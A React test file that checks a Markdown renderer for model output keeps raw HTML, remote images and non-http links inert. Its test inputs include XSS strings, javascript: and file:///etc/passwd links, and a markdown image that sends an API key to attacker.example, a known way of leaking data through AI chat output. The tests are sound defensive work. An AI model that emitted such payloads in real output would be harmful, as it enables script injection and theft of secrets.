/** Security 5: model output (and skill bodies, which use the same component)
 * renders as React nodes only. Raw HTML is text, remote images never load,
 * and links are http(s) only, open without an opener and show their URL. */
import React from 'react';
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { Markdown } from './markdown';

describe('Markdown rendering limits', () => {
  it('raw HTML stays text, with no element created from it', () => {
    const { container } = render(<Markdown text={'<script>alert(1)</script> <iframe src="https://x"></iframe> <b>bold</b>'} />);
    expect(container.querySelector('script, iframe, b')).toBeNull();
    expect(container.textContent).toContain('<script>alert(1)</script>');
  });

  it('a remote image is link text, never an <img> (no request leaves the page)', () => {
    const { container } = render(<Markdown text={'See ![chart](https://attacker.example/x.png?data=API_KEY) here.'} />);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: '[image: chart]' });
    expect(link).toHaveAttribute('href', 'https://attacker.example/x.png?data=API_KEY');
    expect(link).toHaveAttribute('title', 'https://attacker.example/x.png?data=API_KEY');
    expect(container.textContent).not.toContain('!');
  });

  it('an image with a non-http URL stays raw text', () => {
    const { container } = render(<Markdown text={'![x](data:image/png;base64,AAAA) ![y](javascript:alert(1))'} />);
    expect(container.querySelector('img, a')).toBeNull();
    expect(container.textContent).toContain('![x](data:image/png;base64,AAAA)');
  });

  it('links: http(s) only, new tab without opener, full URL in the title', () => {
    const { container } = render(<Markdown text={'[safe](https://example.com/a?b=c) [bad](javascript:alert(1)) [file](file:///etc/passwd)'} />);
    const links = container.querySelectorAll('a');
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute('href', 'https://example.com/a?b=c');
    expect(links[0]).toHaveAttribute('target', '_blank');
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer');
    expect(links[0]).toHaveAttribute('title', 'https://example.com/a?b=c');
    expect(container.textContent).toContain('[bad](javascript:alert(1))');
  });
});
